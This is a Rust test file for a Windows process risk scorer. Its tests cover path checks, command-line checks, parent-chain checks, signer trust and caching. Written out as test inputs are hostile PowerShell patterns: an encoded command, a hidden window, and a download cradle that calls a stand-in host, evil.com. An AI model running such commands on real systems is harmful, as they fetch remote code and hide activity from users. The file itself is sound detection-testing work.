use proc::security::{
    SecurityScorer, RiskCategory, RiskFactor,
    SignatureStatus, is_trusted_signer,
};
use proc::collect::ProcessInfo;

fn make_proc(pid: u32, name: &str, exe: Option<&str>, cmd: Vec<&str>, parent_pid: Option<u32>) -> ProcessInfo {
    ProcessInfo {
        pid,
        name: name.to_string(),
        cpu_usage: 0.0,
        memory: 0,
        virtual_memory: 0,
        disk_usage: (0, 0),
        status: "Running".to_string(),
        exe: exe.map(|s| s.to_string()),
        cmd: cmd.iter().map(|s| s.to_string()).collect(),
        cwd: None,
        parent_pid,
        session_id: None,
        user_id: None,
        start_time: 0,
        run_time: 0,
    }
}

#[test]
fn test_signature_status_display() {
    assert_eq!(format!("{}", SignatureStatus::Trusted), "受信签名");
    assert_eq!(format!("{}", SignatureStatus::Signed), "已签名");
    assert_eq!(format!("{}", SignatureStatus::Unsigned), "无签名");
    assert_eq!(format!("{}", SignatureStatus::Revoked), "签名已吊销");
    assert_eq!(format!("{}", SignatureStatus::Unknown), "未知");
}

#[test]
fn test_path_risk_temp() {
    use proc::security::path_check::check_path_risk;

    let factors = check_path_risk(Some("C:\\Users\\test\\AppData\\Local\\Temp\\evil.exe"));
    assert!(factors.iter().any(|f| f.name == "temp_dir"),
        "Should detect temp directory: {:?}", factors);
    assert!(factors.iter().any(|f| f.weight == 25));

    let factors2 = check_path_risk(Some("C:\\Windows\\Temp\\payload.exe"));
    assert!(factors2.iter().any(|f| f.name == "temp_dir"),
        "Should detect Windows temp: {:?}", factors2);
}

#[test]
fn test_path_risk_downloads() {
    use proc::security::path_check::check_path_risk;

    let factors = check_path_risk(Some("C:\\Users\\test\\Downloads\\malware.exe"));
    assert!(factors.iter().any(|f| f.name == "downloads_dir"),
        "Should detect Downloads directory: {:?}", factors);
    assert!(factors.iter().any(|f| f.weight == 15));
}

#[test]
fn test_path_risk_system32_impersonation() {
    use proc::security::path_check::check_path_risk;

    let factors = check_path_risk(Some("C:\\Users\\test\\cmd.exe"));
    assert!(factors.iter().any(|f| f.name == "system32_impersonation"),
        "Should detect System32 impersonation: {:?}", factors);
    assert!(factors.iter().any(|f| f.weight == 30));

    // Real System32 path should NOT trigger
    let factors_ok = check_path_risk(Some("C:\\Windows\\System32\\cmd.exe"));
    assert!(!factors_ok.iter().any(|f| f.name == "system32_impersonation"),
        "Real System32 should not trigger: {:?}", factors_ok);
}

#[test]
fn test_command_line_encoded() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&["powershell".to_string(), "-enc".to_string(), "SQBFAFgA".to_string()]);
    assert!(factors.iter().any(|f| f.name == "encoded_command"),
        "Should detect -enc: {:?}", factors);
    assert!(factors.iter().any(|f| f.weight == 30));

    let factors2 = check_command_line(&["pwsh".to_string(), "-EncodedCommand".to_string(), "abc".to_string()]);
    assert!(factors2.iter().any(|f| f.name == "encoded_command"),
        "Should detect -EncodedCommand: {:?}", factors2);
}

#[test]
fn test_command_line_hidden() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&["powershell".to_string(), "-WindowStyle".to_string(), "Hidden".to_string()]);
    assert!(factors.iter().any(|f| f.name == "hidden_window"),
        "Should detect hidden window: {:?}", factors);

    let factors2 = check_command_line(&["pwsh".to_string(), "-w".to_string(), "hidden".to_string()]);
    assert!(factors2.iter().any(|f| f.name == "hidden_window"),
        "Should detect -w hidden: {:?}", factors2);
}

#[test]
fn test_command_line_download() {
    use proc::security::command_line::check_command_line;

    let factors = check_command_line(&["powershell".to_string(), "-c".to_string(), "New-Object Net.WebClient | DownloadString('http://evil.com/x')".to_string()]);
    assert!(factors.iter().any(|f| f.name == "web_download"),
        "Should detect DownloadString: {:?}", factors);
    assert!(factors.iter().any(|f| f.weight == 20));
}

#[test]
fn test_parent_chain_office_spawning_cmd() {
    use proc::security::parent_chain::analyze_parent_chain;

    let office_proc = make_proc(100, "WINWORD.EXE", Some("C:\\Program Files\\Microsoft Office\\winword.exe"), vec![], None);
    let cmd_proc = make_proc(200, "cmd.exe", Some("C:\\Windows\\System32\\cmd.exe"), vec![], Some(100));
    let all_procs = vec![office_proc, cmd_proc.clone()];

    let factors = analyze_parent_chain(&cmd_proc, &all_procs);
    assert!(factors.iter().any(|f| f.name == "office_spawning_shell"),
        "Should detect Office spawning cmd: {:?}", factors);
    assert!(factors.iter().any(|f| f.weight == 30));
}

#[test]
fn test_parent_chain_orphan() {
    use proc::security::parent_chain::analyze_parent_chain;

    let orphan = make_proc(300, "suspicious.exe", Some("C:\\Users\\test\\suspicious.exe"), vec![], Some(9999));
    let all_procs = vec![orphan.clone()];

    let factors = analyze_parent_chain(&orphan, &all_procs);
    assert!(factors.iter().any(|f| f.name == "orphan"),
        "Should detect orphan process: {:?}", factors);
    assert!(factors.iter().any(|f| f.weight == 5));
}

#[test]
fn test_score_calculation() {
    let proc = make_proc(1, "test.exe", Some("C:\\Users\\test\\Downloads\\test.exe"),
        vec!["powershell", "-enc", "abc"], None);

    // Manually calculate expected score
    let path_factors = proc::security::path_check::check_path_risk(proc.exe.as_deref());
    let cmd_factors = proc::security::command_line::check_command_line(&proc.cmd);

    let total_deduction: u32 = path_factors.iter()
        .chain(cmd_factors.iter())
        .map(|f| f.weight)
        .sum();

    let expected_score = 100u32.saturating_sub(total_deduction);
    assert!(expected_score < 100, "Suspicious process should score < 100, got {}", expected_score);
}

#[test]
fn test_score_clamp_min() {
    // Create a process that triggers many high-weight risks
    let factors = vec![
        RiskFactor { category: RiskCategory::Signature, name: "unsigned".to_string(), weight: 20, description: "无签名".to_string() },
        RiskFactor { category: RiskCategory::FilePath, name: "temp".to_string(), weight: 25, description: "Temp".to_string() },
        RiskFactor { category: RiskCategory::CommandLine, name: "encoded".to_string(), weight: 30, description: "Encoded".to_string() },
        RiskFactor { category: RiskCategory::FilePath, name: "impersonation".to_string(), weight: 30, description: "Impersonation".to_string() },
        RiskFactor { category: RiskCategory::ParentChain, name: "office".to_string(), weight: 30, description: "Office".to_string() },
    ];
    let total: u32 = factors.iter().map(|f| f.weight).sum();
    let score = 100u32.saturating_sub(total);
    assert_eq!(score, 0, "Score should clamp to 0, got {}", score);
}

#[test]
fn test_score_cache_hit() {
    let mut scorer = SecurityScorer::new();
    let proc = make_proc(1, "test.exe", Some("C:\\test.exe"), vec![], None);
    let all_procs = vec![proc.clone()];

    let score1 = scorer.score(&proc, &all_procs, &[]);
    let score2 = scorer.score(&proc, &all_procs, &[]);

    assert_eq!(score1.score, score2.score, "Cached score should match");
    assert_eq!(score1.factors.len(), score2.factors.len());
}

#[test]
fn test_score_cache_invalidation() {
    let mut scorer = SecurityScorer::new();
    let proc = make_proc(1, "test.exe", Some("C:\\test.exe"), vec![], None);
    let all_procs = vec![proc.clone()];

    let _score1 = scorer.score(&proc, &all_procs, &[]);

    // PID 1 is dead, only PID 2 alive
    let mut alive = std::collections::HashSet::new();
    alive.insert(2);
    scorer.invalidate_dead(&alive);

    // Cache for PID 1 should be evicted
    let score2 = scorer.score(&proc, &all_procs, &[]);
    // Should recompute (same result but cache was cleared)
    assert!(score2.score <= 100);
}

#[test]
fn test_trusted_signer() {
    assert!(is_trusted_signer("Microsoft Corporation"));
    assert!(is_trusted_signer("Microsoft Windows"));
    assert!(is_trusted_signer("Google LLC"));
    assert!(is_trusted_signer("Google Inc"));
    assert!(is_trusted_signer("Mozilla Corporation"));
    assert!(is_trusted_signer("Apple Inc."));
    assert!(is_trusted_signer("Intel Corporation"));
    assert!(is_trusted_signer("NVIDIA Corporation"));

    // Case insensitive
    assert!(is_trusted_signer("microsoft corporation"));
    assert!(is_trusted_signer("MICROSOFT CORPORATION"));

    // Non-trusted
    assert!(!is_trusted_signer("Evil Corp"));
    assert!(!is_trusted_signer("Unknown Publisher"));
}
